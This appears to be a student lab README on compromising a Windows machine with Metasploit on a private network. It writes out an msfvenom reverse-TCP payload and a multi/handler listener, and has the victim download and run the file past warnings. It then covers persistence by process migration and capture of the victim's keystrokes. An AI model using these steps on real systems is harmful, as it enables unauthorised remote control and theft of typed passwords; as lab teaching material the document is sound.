# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig

## OUTPUT:

![image](https://github.com/Catty12384/Compromising-windows-using-Metasploit/assets/120629225/da353d35-163a-4c9c-9292-57d3d570cd60)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/Catty12384/Compromising-windows-using-Metasploit/assets/120629225/68408bad-cbc3-401d-98b8-9bb0b5b1c853)

copy the fun.exe into the apache /var/www/html folder

![image (3)](https://github.com/Catty12384/Compromising-windows-using-Metasploit/assets/120629225/8dd4bbfb-e900-4cbd-acdd-afdfafc8492b)

Start apache server sudo systemctl apache2 start

![image (4)](https://github.com/Catty12384/Compromising-windows-using-Metasploit/assets/120629225/ec22f85a-9849-4a6f-89fd-721a516cc895)

Check the status of apache2

![image](https://github.com/Catty12384/Compromising-windows-using-Metasploit/assets/120629225/60c2c633-daef-4421-b19a-a2f36be948b5)

Invoke msfconsole:

## OUTPUT: 

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![image](https://github.com/Catty12384/Compromising-windows-using-Metasploit/assets/120629225/3c47d83d-7e0e-4b64-9a5c-70520f47b4bb)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/Catty12384/Compromising-windows-using-Metasploit/assets/120629225/13815e74-4261-4a08-b80c-adb6847b1773)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
Starting a command and control Server use multi/handler 6out set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/Catty12384/Compromising-windows-using-Metasploit/assets/120629225/c3a211a0-5a0f-475b-a531-7d6bf902c4e9)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156 

![image](https://github.com/Catty12384/Compromising-windows-using-Metasploit/assets/120629225/09610854-4615-42b2-9a6e-2fc6f7994f37)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/Catty12384/Compromising-windows-using-Metasploit/assets/120629225/810b0c86-cdc9-4dcb-a0b6-3f4592813653)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/Catty12384/Compromising-windows-using-Metasploit/assets/120629225/a581b811-38b6-46e1-a6de-bd3253408437)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
